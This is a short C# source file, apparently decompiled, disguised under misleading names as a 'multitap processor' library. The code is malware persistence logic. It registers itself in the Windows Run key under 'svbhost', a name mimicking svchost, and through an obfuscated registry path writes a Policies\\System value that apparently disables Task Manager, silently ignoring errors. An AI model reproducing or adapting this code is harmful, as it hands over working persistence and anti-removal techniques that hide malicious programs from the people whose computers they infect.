using System;
using System.Windows.Forms;
using Microsoft.Win32;

namespace MULTITAPPROCESSORLIB;

internal class multitapADD
{
	private const string name = "svbhost";

	private string processname = "TaskMgr";

	public bool TAPVerifier(int grade)
	{
		if (grade < DateTime.Now.Year && grade > DateTime.Now.Second)
		{
			return true;
		}
		return false;
	}

	public bool SETTAPDELAYVALUE(bool autorun)
	{
		string executablePath = Application.get_ExecutablePath();
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
		try
		{
			if (autorun)
			{
				registryKey.SetValue("svbhost", executablePath);
			}
			else
			{
				registryKey.DeleteValue("svbhost");
			}
			registryKey.Close();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public bool checkSpotOS(string osmane)
	{
		if (osmane == "win")
		{
			return true;
		}
		return false;
	}

	public void setmagicrun(string spotrunnerpath, string paternname)
	{
		try
		{
			if (checkSpotOS("win"))
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(spotrunnerpath + "ndows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue(paternname + processname, 1);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}
}
